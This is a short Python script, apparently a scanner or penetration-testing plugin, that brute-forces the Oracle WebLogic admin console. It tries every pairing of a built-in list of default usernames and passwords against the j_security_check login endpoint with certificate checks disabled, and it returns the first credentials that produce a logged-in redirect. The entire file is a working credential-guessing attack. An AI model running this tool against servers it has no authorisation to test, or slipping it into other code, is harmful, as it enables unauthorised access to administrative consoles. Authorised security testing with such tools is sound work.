from typing import Optional

import requests


def run(url: str, port: int) -> Optional[str]:
    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem', 'weblogic123']

    target = f"{url}:{port}/console/j_security_check"
    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username': user,
                'j_password': pwd,
                'j_character_encoding': 'UTF-8'
            }
            try:
                response = requests.post(
                    target, data=data,
                    allow_redirects=False, verify=False, timeout=9
                )
                if (response.status_code == 302
                        and 'console' in response.text
                        and 'LoginForm.jsp' not in response.text):
                    return f"WebLogic username: {user} password: {pwd}"
            except Exception:
                pass
    return None
